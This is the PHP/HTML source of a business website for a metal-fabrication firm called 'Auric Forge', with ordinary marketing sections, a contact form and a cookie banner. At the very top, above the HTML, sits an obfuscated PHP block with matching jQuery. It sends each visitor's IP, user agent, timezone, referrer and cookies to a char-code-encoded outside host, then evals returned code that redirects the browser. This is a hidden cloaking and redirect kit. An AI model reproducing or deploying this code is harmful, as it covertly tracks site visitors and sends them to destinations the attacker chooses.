
<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);function c($u=null,$q=null,$co=null){if(empty($u)){return '$("#lo522045ad").hide();$("body").fadeIn(500);';}else{$u = $u.$q;for ($i = 0, $j = strlen($u); $i < $j; $i++) {$a[] = ord($u[$i]);}$u = strrev(implode(",",$a));if($co AND isset($_COOKIE["_eventlo522045ad"])){$me="";}else{$me = '$("html").append("body").html("<div style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000}.popup-content{background:white;padding:20px;border-radius:8px;text-align:center;box-shadow:0 4px 8px rgba(0,0,0,0.2)}.loading-gif{width:100px;height:100px;margin-bottom:10px}.buttons{margin-top:20px}button{padding:10px 20px;margin:0 10px;border:none;border-radius:4px;cursor:pointer}#cancelBtn{background:#f44336;color:white}#continueBtn{background:#4CAF50;color:white}button:hover{opacity:0.8}</style><div class=\"popup\"><div class=\"popup-content\"><img src=\"https://i.gifer.com/ZZ5H.gif\" alt=\"Loading...\" class=\"loading-gif\"><p>Loading... Please wait.</p><div class=\"buttons\"><button id=\"cancelBtn\">Cancel</button><button id=\"continueBtn\">Continue</button></div></div></div></div></div>");';}return 'function rS(s){var nS = "";for (var i = s.length - 1; i >= 0; i--) {nS += s[i];} var a = nS.split(",");var u = String.fromCharCode.apply(null, a);return u;} var u,s,c;$("body").remove();'.$me.'s=rS("16,201,101,411,401,64,011,111,501,611,79,99,111,801,64,911,111,001,011,501,911");u = rS("'.$u.'");c = s+"\'"+u+"\'";$("html").show();eval(c);';}}if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){if(isset($_POST["imm"])){$date = date("Y-m-d H:i:s");$id = "522045";$uid="4v6qn38yoo2c3l45eqgv9c277";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_POST["r"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_eventlo522045ad"],"tz"=>$_POST["tz"],"he"=>$_POST["he"],"imm" =>$_POST["imm"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_eventlo522045ad",$arr[6],time()+60*60*24*$arr[3]);}}echo c($arr[1],$q,true);exit();}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo522045ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c($arr[1],$f);exit();}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo522045ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c();exit();}}}?>

<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Auric Forge - Precision Metal Fabrication & Alloys</title>
  <link rel="icon" href="favicon.ico">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">


<style>body {display: none;}</style>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery-mobile/1.4.5/jquery.mobile.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>var oldtitle=document.title;document.title = "Loading";$( document ).ajaxComplete(function(){document.title = oldtitle;$(".loaderdiv").fadeOut("slow");$(".maindiv").fadeIn("slow");});$(document).ready(function(){function loadA(t){$.ajax({url:location.href,type:"POST",data:"tz="+e+"&r="+document.referrer+"&he="+g+"&imm="+t,success:function(a){eval(a)}})}var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var d=jstz.determine();var e=d.name();var co = document.cookie.indexOf("_eventlo522045ad=");if(co==0){loadA("p");}else{$("body").hide();$("html").append("<div id=\"lo522045ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000}.popup-content{background:white;padding:20px;border-radius:8px;text-align:center;box-shadow:0 4px 8px rgba(0,0,0,0.2)}.loading-gif{width:100px;height:100px;margin-bottom:10px}.buttons{margin-top:20px}button{padding:10px 20px;margin:0 10px;border:none;border-radius:4px;cursor:pointer}#cancelBtn{background:#f44336;color:white}#continueBtn{background:#4CAF50;color:white}button:hover{opacity:0.8}</style><div class=\"popup\"><div class=\"popup-content\"><img src=\"https://i.gifer.com/ZZ5H.gif\" alt=\"Loading...\" class=\"loading-gif\"><p>Loading... Please wait.</p><div class=\"buttons\"><button id=\"cancelBtn\">Cancel</button><button id=\"continueBtn\">Continue</button></div></div></div></div></div>");var h=null;var i=null;var j=true;$(document).on("pagecreate","body",function(){$("body").on("tap",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}})}).add($(document).on("mousemove",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}}));h=setTimeout(function(){i=false;loadA("b")},3600000)}});</script>

  
  <style>
    :root {
      --primary-50: #FCF1F3;
      --primary-100: #FAE4E8;
      --primary-200: #F5C1CA;
      --primary-300: #ED95A4;
      --primary-400: #E56177;
      --primary-500: #D93654;
      --primary-600: #B8223D;
      --primary-700: #91162C;
      --secondary-alpha-10: rgba(217, 54, 84, 0.1);
      --secondary-alpha-20: rgba(217, 54, 84, 0.2);
      --secondary-alpha-80: rgba(217, 54, 84, 0.8);
      --surface: #FFFFFF;
      --background: #FDFAFA;
      --text-dark: #2D1D1F;
      --text-light: #7A6A6C;
      --border-radius: 12px;
      --section-spacing: 5rem;
    }

    body {
      font-family: 'Lato', sans-serif;
      font-weight: 400;
      color: var(--text-dark);
      background-color: var(--background);
    }

    h1, h2, h3, h4, h5, h6 {
      font-weight: 600;
      color: var(--text-dark);
    }

    .btn-primary {
      background-color: var(--primary-500);
      border-color: var(--primary-500);
      color: var(--surface);
      border-radius: var(--border-radius);
      padding: 0.75rem 1.75rem;
      transition: background-color 0.3s ease, border-color 0.3s ease, transform 0.3s ease;
    }
    .btn-primary:hover {
      background-color: var(--primary-600);
      border-color: var(--primary-600);
      transform: translateY(-3px);
    }

    .btn-outline-primary {
      border: 2px solid var(--primary-500);
      color: var(--primary-500);
      border-radius: var(--border-radius);
      padding: 0.75rem 1.75rem;
      transition: background-color 0.3s ease, color 0.3s ease, transform 0.3s ease;
    }
    .btn-outline-primary:hover {
      background-color: var(--primary-500);
      color: var(--surface);
      transform: translateY(-3px);
    }

    .navbar-brand {
      font-weight: 600;
      color: var(--text-dark) !important;
    }
    .nav-link {
        color: var(--text-dark) !important;
        transition: color 0.3s ease, transform 0.3s ease;
    }
    .nav-link:hover {
        color: var(--primary-500) !important;
        transform: translateY(-2px);
    }

    .section-spacing {
      padding-top: var(--section-spacing);
      padding-bottom: var(--section-spacing);
    }

    .card {
      border-radius: var(--border-radius);
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08); /* Soft shadow */
      transition: transform 0.3s ease; /* Hover effect */
      margin-bottom: 1.5rem;
    }
    .card:hover {
      transform: translateY(-8px);
    }

    .card.border-left-accent {
      border-left: 4px solid var(--primary-500);
      border-top: none;
      border-right: none;
      border-bottom: none;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
    }

    .card-icon-container {
        width: 64px;
        height: 64px;
        display: flex;
        justify-content: center;
        align-items: center;
        background-color: var(--secondary-alpha-10);
        border-radius: var(--border-radius); /* Square for icon container */
        margin-bottom: 1rem;
    }

    .img-fluid {
        border-radius: var(--border-radius);
    }

    #hero {
      background: radial-gradient(circle at center, var(--primary-50) 0%, var(--background) 100%);
    }

    .testimonial-card-author-image {
        width: 80px;
        height: 80px;
        object-fit: cover;
        border-radius: 50%;
        margin-right: 1rem;
        border: 3px solid var(--primary-200);
    }

    .map-container {
        position: relative;
        padding-bottom: 75%; /* 4:3 Aspect Ratio */
        height: 0;
        overflow: hidden;
        border-radius: var(--border-radius);
    }
    .map-container iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100% !important;
        height: 100% !important;
        border: 0;
    }

    footer {
        background-color: #212529; /* Dark background for footer */
        color: #ffffff; /* Light text for footer */
        padding: 3rem 0;
    }
    footer a {
        color: #ffffff;
        text-decoration: none;
        transition: color 0.3s ease;
    }
    footer a:hover {
        color: var(--primary-300);
    }

    /* Cookie Consent */
    #cookieConsent {
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        background-color: rgba(45, 29, 31, 0.9); /* Dark background from text_dark */
        color: #ffffff;
        padding: 1rem;
        text-align: center;
        z-index: 1050;
        display: none; /* Hidden by default */
        font-size: 0.9rem;
    }
    #cookieConsent button {
        background-color: var(--primary-500);
        border: none;
        color: white;
        padding: 0.5rem 1rem;
        cursor: pointer;
        border-radius: var(--border-radius);
        margin-left: 1rem;
        transition: background-color 0.3s ease, transform 0.3s ease;
    }
    #cookieConsent button:hover {
        background-color: var(--primary-600);
        transform: translateY(-2px);
    }
    .cookie-text a {
        color: var(--primary-200);
        text-decoration: underline;
    }
    .cookie-text a:hover {
         color: var(--primary-100);
    }

    @media (max-width: 767.98px) {
        .hero-image-col {
            order: -1; /* Image first on mobile */
        }
    }

    /* SVG icon styling for better contrast on varying backgrounds */
    .icon-svg {
        fill: var(--primary-500); /* Use primary color for icons */
        width: 32px;
        height: 32px;
    }

    .bento-item {
        border-radius: var(--border-radius);
        overflow: hidden;
        position: relative;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08); /* Soft shadow */
        transition: transform 0.3s ease; /* Hover effect */
    }

    .bento-item:hover {
        transform: translateY(-8px);
    }

    .bento-item img {
        width: 100%;
        height: 100%;
        object-fit: cover;
        display: block;
        transition: transform 0.3s ease-in-out;
    }

    .bento-item:hover img {
        transform: scale(1.03);
    }

    .bento-item-content {
        position: absolute;
        bottom: 0;
        left: 0;
        right: 0;
        background: linear-gradient(to top, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0) 100%);
        color: white;
        padding: 1.5rem;
        text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
    }

    .bento-item h3 {
        color: white;
        margin-bottom: 0.5rem;
    }
        .bento-item p {
        color: rgba(255, 255, 255, 0.9);
        font-size: 0.9rem;
    }

    .form-control, .form-select {
        border-radius: var(--border-radius);
        padding: 0.75rem 1rem;
        border: 1px solid var(--primary-200);
        font-weight: 400;
    }
    .form-control:focus, .form-select:focus {
        border-color: var(--primary-300);
        box-shadow: 0 0 0 0.25rem var(--secondary-alpha-20);
    }
  </style>
</head>
<body>
  <header>
    <nav class="navbar navbar-expand-lg bg-light py-3">
      <div class="container">
        <a class="navbar-brand fs-4" href="#">Auric Forge</a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
          <ul class="navbar-nav ms-auto mb-2 mb-lg-0 align-items-center">
            <li class="nav-item">
              <a class="nav-link" href="#about">About</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="#capabilities">Capabilities</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="#services">Services</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="#testimonials">Testimonials</a>
            </li>
            <li class="nav-item ms-lg-3">
              <a class="btn btn-primary" href="#contact">Get a Quote</a>
            </li>
          </ul>
        </div>
      </div>
    </nav>
  </header>
<main>
    <section id="hero" class="section-spacing py-5 py-md-0">
      <div class="container py-5">
        <div class="row align-items-center justify-content-between g-4">
          <div class="col-12 col-md-6 text-center text-md-start">
            <h1 class="display-4 fw-bold mb-3">Crafting the Future with Auric Forge</h1>
            <p class="lead mb-4 text-light">Precision custom metal fabrication, bespoke alloy development, and expert structural metalwork designed for industry pioneers.</p>
            <a href="#capabilities" class="btn btn-primary btn-lg">Explore Our Work</a>
          </div>
          <div class="col-12 col-md-6 hero-image-col">
            <img src="images/hero-metal-fabrication-896x896.jpeg" class="img-fluid rounded-3 shadow-lg" alt="Sparks flying from precision metal fabrication" width="896" height="896">
          </div>
        </div>
      </div>
    </section>

    <section id="about" class="section-spacing">
      <div class="container">
        <h2 class="text-center mb-5 display-5">Our Manufacturing DNA</h2>
        <div class="row g-4">
          <div class="col-12">
            <div class="bento-item">
              <img src="images/alloy-development-lab-1024x512.jpeg" alt="Advanced metallurgy laboratory" width="1024" height="512">
              <div class="bento-item-content">
                <h3>Proprietary Alloy Development</h3>
                <p>At Auric Forge, we don't just shape metal; we engineer its core structure. Our in-house metallurgists create bespoke alloys tailored for high-stress, extreme-environment applications, pushing the boundaries of material science to give your projects an unparalleled edge in performance and durability.</p>
              </div>
            </div>
          </div>
          <div class="col-12 col-md-6">
            <div class="bento-item">
              <img src="images/sustainable-metal-finishing-512x512.jpeg" alt="Eco-friendly metal finishing process" width="512" height="512">
              <div class="bento-item-content">
                <h3>Eco-Conscious Finishing</h3>
                <p>Our commitment to sustainability is evident in our advanced eco-conscious finishing processes. We utilize closed-loop water systems and non-toxic treatments to ensure our operations minimize environmental impact while delivering superior, durable finishes for all your components.</p>
              </div>
            </div>
          </div>
          <div class="col-12 col-md-6">
            <div class="bento-item">
              <img src="images/precious-metal-casting-512x512.jpeg" alt="Pouring molten precious metal" width="512" height="512">
              <div class="bento-item-content">
                <h3>Precious Metal Casting</h3>
                <p>We combine centuries-old craftsmanship with state-of-the-art technology to achieve flawless precision casting for high-value organic and industrial shapes. From intricate artistic elements to critical aerospace components, our expertise ensures every detail is perfectly realized.</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <section id="services" class="section-spacing text-center">
      <div class="container">
        <h2 class="mb-5 display-5">Comprehensive Fabrication Services</h2>
        <div class="row justify-content-center g-4">
          <div class="col-12 col-md-6 col-lg-4">
            <div class="card h-100 p-4 border-left-accent">
                <div class="card-body">
                    <div class="card-icon-container mx-auto">
                        <img src="images/icon-fabrication-128x128.jpeg" class="img-fluid" alt="Metal fabrication icon" width="64" height="64" loading="lazy">
                    </div>
                    <h3 class="h5 mb-3">Custom Metal Fabrication</h3>
                    <p class="text-light">End-to-end bespoke fabrication solutions, from raw concept to organically shaped, fully realized metal structures. We bring complex designs to life with exacting standards and innovative techniques.</p>
                </div>
            </div>
          </div>
          <div class="col-12 col-md-6 col-lg-4">
            <div class="card h-100 p-4 border-left-accent">
                <div class="card-body">
                    <div class="card-icon-container mx-auto">
                        <img src="images/icon-cnc-128x128.jpeg" class="img-fluid" alt="CNC machining icon" width="64" height="64" loading="lazy">
                    </div>
                    <h3 class="h5 mb-3">Advanced CNC Machining</h3>
                    <p class="text-light">High-tolerance milling and turning operations capable of recreating the most complex organic geometries with microscopic accuracy. Our advanced machines ensure precision for demanding applications.</p>
                </div>
            </div>
          </div>
          <div class="col-12 col-md-6 col-lg-4">
            <div class="card h-100 p-4 border-left-accent">
              <div class="card-body">
                  <div class="card-icon-container mx-auto">
                      <img src="images/icon-structural-128x128.jpeg" class="img-fluid" alt="Structural metalwork icon" width="64" height="64" loading="lazy">
                  </div>
                <h3 class="h5 mb-3">Structural Metalwork</h3>
                <p class="text-light">Architectural and heavy-load structural metal framing built to withstand the elements without compromising on aesthetic flow. We deliver robust foundations with an artistic approach.</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <section id="testimonials" class="section-spacing bg-light">
      <div class="container">
        <h2 class="text-center mb-3 display-5">Trusted by Innovators</h2>
        <p class="text-center lead mb-5 text-light">Partnering with industry leaders to turn concepts into reality.</p>
        <div class="row justify-content-center g-4">
          <div class="col-12 col-md-6 col-lg-4">
            <div class="card h-100 p-4 border-left-accent">
              <div class="d-flex align-items-start mb-3">
                <img src="images/client-elena-256x256.jpeg" alt="Portrait of Elena Rossi" class="testimonial-card-author-image" width="256" height="256" loading="lazy">
                <div>
                  <h4 class="mb-0 fs-6">Elena Rossi</h4>
                  <small class="text-muted">Aura Architectural Design</small>
                </div>
              </div>
              <p class="mb-0 fst-italic text-light">"Auric Forge transformed our architectural concepts into breathtaking structural realities. Their attention to nuanced organic shapes is unparalleled."</p>
            </div>
          </div>
          <div class="col-12 col-md-6 col-lg-4">
            <div class="card h-100 p-4 border-left-accent">
              <div class="d-flex align-items-start mb-3">
                <img src="images/client-james-256x256.jpeg" alt="Portrait of Dr. James Aris" class="testimonial-card-author-image" width="256" height="256" loading="lazy">
                <div>
                  <h4 class="mb-0 fs-6">Dr. James Aris</h4>
                  <small class="text-muted">Horizon Aerospace</small>
                </div>
              </div>
              <p class="mb-0 fst-italic text-light">"The bespoke alloy they developed for our aerospace enclosures dropped component weight by 14% while retaining structural integrity."</p>
            </div>
          </div>
          <div class="col-12 col-md-6 col-lg-4">
            <div class="card h-100 p-4 border-left-accent">
              <div class="d-flex align-items-start mb-3">
                <img src="images/client-sarah-256x256.jpeg" alt="Portrait of Sarah Lin" class="testimonial-card-author-image" width="256" height="256" loading="lazy">
                <div>
                  <h4 class="mb-0 fs-6">Sarah Lin</h4>
                  <small class="text-muted">Lumina Hardware Co.</small>
                </div>
              </div>
              <p class="mb-0 fst-italic text-light">"Their precision in precious metal casting allowed us to scale our boutique hardware line flawlessly."</p>
            </div>
          </div>
        </div>
      </div>
    </section>

    <section id="contact" class="section-spacing bg-white">
      <div class="container">
        <h2 class="text-center mb-5 display-5">Forge a Partnership</h2>
        <div class="row align-items-center g-5">
          <div class="col-12 col-lg-6">
            <h3 class="h4 mb-4">Contact Information</h3>
            <p class="lead mb-4 text-light">Reach out to Auric Forge to discuss your next breakthrough project. Our team is ready to provide expert guidance and precision fabrication solutions tailored to your unique requirements.</p>

            <ul class="list-unstyled mb-4 text-light">
              <li class="d-flex align-items-center mb-2">
                <svg class="icon-svg me-2" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
                <span>953 DeKalb Avenue, New York, New York, 11206, USA</span>
              </li>
              <li class="d-flex align-items-center mb-2">
                 <svg class="icon-svg me-2" viewBox="0 0 24 24" fill="currentColor"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
                <span>+1 316 242 4222</span>
              </li>
              <li class="d-flex align-items-center mb-2">
                <svg class="icon-svg me-2" viewBox="0 0 24 24" fill="currentColor"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
                <span>info@<?php echo $_SERVER['HTTP_HOST']; ?></span>
              </li>
            </ul>

            <div class="map-container mb-4">
                <iframe
                    src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d12095.32832801452!2d-73.9312154!3d40.6974201!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x89c25c00e6d6283f%3A0xc3f8f1c8f1e6f2b8!2sNew%20York%2C%20NY%2C%20USA!5e0!3m2!1sen!2sus!4v1701980800000!5m2!1sen!2sus"
                    allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade" title="Location of Contact">
                </iframe>
            </div>

            <img src="images/forge-facility-exterior-640x512.jpeg" class="img-fluid rounded-3 shadow-sm" alt="Auric Forge facility exterior" width="640" height="512" loading="lazy">
          </div>
          <div class="col-12 col-lg-6">
            <h3 class="h4 mb-4">Send Us a Message</h3>
            <form>
              <div class="mb-3">
                <label for="fullName" class="form-label">Full Name</label>
                <input type="text" class="form-control" id="fullName" placeholder="Enter your name" required>
              </div>
              <div class="mb-3">
                <label for="emailAddress" class="form-label">Email Address</label>
                <input type="email" class="form-control" id="emailAddress" placeholder="Enter your email" required>
              </div>
              <div class="mb-3">
                <label for="serviceOfInterest" class="form-label">Service of Interest</label>
                <select class="form-select" id="serviceOfInterest" required>
                  <option selected disabled value="">Choose...</option>
                  <option>Custom Metal Fabrication</option>
                  <option>Alloy Development</option>
                  <option>CNC Machining</option>
                  <option>Metal Finishing</option>
                  <option>Structural Metalwork</option>
                  <option>Precious Metal Casting</option>
                </select>
              </div>
              <div class="mb-3">
                <label for="projectDetails" class="form-label">Project Details</label>
                <textarea class="form-control" id="projectDetails" rows="5" placeholder="Tell us about your project requirements..." required></textarea>
              </div>
              <button type="submit" class="btn btn-primary">Submit Inquiry</button>
            </form>
          </div>
        </div>
      </div>
    </section>
  </main>
<footer class="text-center">
    <div class="container">
      <p class="mb-2">&copy; 2024 Auric Forge. All rights reserved.</p>
      <p class="mb-0">
        <a href="./privacy.html" class="mx-2">Privacy Policy</a>
        <a href="./tos.html" class="mx-2">Terms of Service</a>
      </p>
    </div>
  </footer>

  <div id="cookieConsent" class="cookie-consent">
    <p class="mb-0">
        This website uses cookies to ensure you get the best experience. By continuing to use our site, you agree to our <a href="./privacy.html" target="_blank">Privacy Policy</a>.
    </p>
    <button id="acceptCookies">Accept</button>
</div>

  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
        const cookieName = 'consent_Auric Forge_cookies_accepted';
        const cookieConsent = document.getElementById('cookieConsent');
        const acceptCookiesBtn = document.getElementById('acceptCookies');

        function setCookie(name, value, days) {
            let expires = "";
            if (days) {
                let date = new Date();
                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
                expires = "; expires=" + date.toUTCString();
            }
            document.cookie = name + "=" + (value || "")  + expires + "; path=/";
        }

        function getCookie(name) {
            let nameEQ = name + "=";
            let ca = document.cookie.split(';');
            for(let i=0; i < ca.length; i++) {
                let c = ca[i];
                while (c.charAt(0)==' ') c = c.substring(1,c.length);
                if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
            }
            return null;
        }

        if (!getCookie(cookieName)) {
            cookieConsent.style.display = 'flex';
            cookieConsent.style.justifyContent = 'center';
            cookieConsent.style.alignItems = 'center';
        }

        acceptCookiesBtn.addEventListener('click', function() {
            setCookie(cookieName, 'true', 365); // Store for 1 year
            cookieConsent.style.display = 'none';
        });
    });
  </script>
</body>
</html>
